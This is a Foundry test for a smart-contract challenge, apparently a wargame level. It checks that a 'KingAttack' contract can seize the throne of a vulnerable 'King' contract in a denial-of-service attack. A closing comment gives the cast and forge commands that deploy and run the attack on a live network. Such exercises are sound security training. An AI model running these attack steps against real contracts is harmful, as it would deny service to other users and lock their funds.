// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {King} from "../src/King.sol";
import {KingAttack} from "../solutions/KingAttack.sol";

contract KingTest is Test {
    King public king;
    KingAttack public attackContract;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        vm.deal(owner, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.prank(owner);
        king = new King{value: 0.01 ether}();
    }

    function test_dosAttack() public {
        vm.startPrank(attacker);

        // deploy attack contract
        attackContract = new KingAttack();

        assertEq(king.prize(), 0.01 ether);

        attackContract.attack{value: 0.1 ether}(payable(address(king)));

        assertEq(king._king(), address(attackContract));

        vm.stopPrank();
    }
}

/* 
source .env
export king=0xa07046c092EA2fc7ec173cD7C2F00221aD7892B7
cast call $king "owner()" --rpc-url $RPC_URL
cast call $king "prize()" --rpc-url $RPC_URL
cast call $king "_king()" --rpc-url $RPC_URL
forge create solutions/KingAttack.sol:KingAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $king
export attack=0x329E3EA36DE43b067b95B6FaC47e5F751A43bE1F
cast send $attack "attack(address)" $king --value 0.01ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
